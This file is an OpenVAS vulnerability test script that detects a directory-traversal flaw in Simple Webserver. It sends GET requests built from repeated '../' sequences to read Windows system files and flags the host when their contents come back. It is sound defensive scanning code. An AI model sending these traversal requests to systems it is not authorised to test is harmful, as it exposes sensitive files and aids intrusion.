###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sws_dir_traversal_01_2013.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# Simple Webserver Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Simple Webserver is prone to a directory-traversal vulnerability because it
fails to properly sanitize user-supplied input.

Remote attackers can use specially crafted requests with directory-
traversal sequences ('../') to retrieve arbitrary files in the context
of the application.

Exploiting this issue may allow an attacker to obtain sensitive
information that could aid in further attacks.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103632";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 7577 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("Simple Webserver Directory Traversal Vulnerability");

 script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/119239/Simple-Webserver-2.3-rc1-Directory-Traversal.html");

 script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2013-01-04 10:25:13 +0100 (Fri, 04 Jan 2013)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("PMSoftware-SWS/banner");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);

banner = get_http_banner(port:port);
if(banner && "Server: PMSoftware-SWS" >!< banner)exit(0);

files = traversal_files('windows');

foreach file(keys(files)) {

  req = string("GET ", crap(data:"../",length:9*6),files[file]," HTTP/1.1\r\n\r\n");
  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  if(eregmatch(pattern:file, string:result)) {
    security_message(port:port);
    exit(0);
  }  

}  

exit(0);
